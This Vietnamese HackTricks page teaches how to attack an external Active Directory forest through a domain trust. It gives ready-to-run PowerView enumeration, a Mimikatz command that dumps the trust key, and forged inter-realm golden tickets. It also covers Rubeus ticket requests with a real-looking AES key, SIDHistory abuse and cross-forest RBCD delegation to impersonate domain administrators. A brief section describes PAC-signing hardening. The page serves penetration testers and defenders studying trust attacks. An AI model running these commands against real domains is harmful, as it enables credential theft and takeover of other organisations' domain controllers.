# Domain Forest bên ngoài - OneWay (Inbound) hoặc hai chiều

{{#include ../../banners/hacktricks-training.md}}

Trong tình huống này, một domain bên ngoài tin cậy bạn (hoặc cả hai tin cậy lẫn nhau), vì vậy bạn có thể giành được một dạng quyền truy cập vào domain đó.

## Enumeration

Trước tiên, bạn cần **enumerate** **trust**:

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
                          DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```

> `SelectiveAuthentication`/`SIDFiltering*` cho phép bạn nhanh chóng xác định liệu các đường tấn công lạm dụng cross-forest (RBCD, SIDHistory) có khả năng hoạt động mà không cần điều kiện tiên quyết bổ sung hay không.<sup>[[2]](#references)</sup>

Trong quá trình enumeration trước đó, đã phát hiện người dùng **`crossuser`** thuộc nhóm **`External Admins`**, nhóm này có **quyền Admin** trên **DC của domain bên ngoài**.

## Truy cập ban đầu

Nếu bạn **không thể** tìm thấy **quyền** đặc biệt nào của người dùng mình trong domain khác, bạn vẫn có thể quay lại AD Methodology và thử **privesc từ một người dùng không có đặc quyền** (ví dụ như kerberoasting):

Bạn có thể dùng **các hàm Powerview** để **enumerate** **domain khác** bằng tham số `-Domain`, như sau:

```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```


{{#ref}}
./
{{#endref}}

## Mạo danh

### Đăng nhập

Sử dụng phương thức thông thường với thông tin xác thực của người dùng có quyền truy cập vào miền bên ngoài, bạn sẽ có thể truy cập:

```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```

### Lạm dụng SID History

Bạn cũng có thể lạm dụng [**SID History**](sid-history-injection.md) qua forest trust.

Nếu người dùng được di chuyển **từ forest này sang forest khác** và **SID Filtering chưa được bật**, bạn có thể **thêm một SID từ forest kia**. SID này sẽ được **thêm** vào **token của người dùng** khi xác thực **qua trust**.

> [!WARNING]
> Xin nhắc lại, bạn có thể lấy signing key bằng cách
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

Bạn có thể **ký bằng** khóa **đáng tin cậy** một **TGT giả mạo** người dùng của miền hiện tại.

```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```

### Cách đầy đủ để mạo danh người dùng

```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```

### RBCD xuyên forest khi bạn kiểm soát một machine account trong trusting forest (không có SID filtering / selective auth)

Nếu foreign principal (FSP) đưa bạn vào một group có quyền ghi các computer object trong trusting forest (ví dụ: `Account Operators`, custom provisioning group), bạn có thể cấu hình **Resource-Based Constrained Delegation** trên một target host của forest đó và impersonate bất kỳ user nào tại đó:

```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```

Điều này chỉ hoạt động khi **SelectiveAuthentication bị tắt** và **SID filtering** không loại bỏ SID mà bạn kiểm soát. Đây là một lateral path nhanh, không cần giả mạo SIDHistory và thường bị bỏ sót khi rà soát trust.<sup>[[2]](#references)</sup>

### Tăng cường xác thực PAC

Các bản cập nhật xác thực chữ ký PAC cho **CVE-2024-26248**/**CVE-2024-29056** bổ sung yêu cầu ký đối với ticket giữa các forest. Trong **Compatibility mode**, các đường tấn công giả mạo PAC/SIDHistory/S4U giữa các realm vẫn có thể hoạt động trên những DC chưa được vá. Trong **Enforcement mode**, dữ liệu PAC không có chữ ký hoặc đã bị sửa đổi khi đi qua forest trust sẽ bị từ chối, trừ khi bạn cũng nắm giữ khóa trust của forest đích. Các tùy chỉnh registry (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) có thể làm suy yếu cơ chế này trong thời gian chúng vẫn còn được hỗ trợ.<sup>[[1]](#references)</sup>

## References

- [1] [Microsoft KB5037754 – Các thay đổi về xác thực PAC liên quan đến CVE-2024-26248 và CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [2] [Đặc tả MS-PAC – Chi tiết về SID filtering và chuyển đổi claims](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
{{#include ../../banners/hacktricks-training.md}}
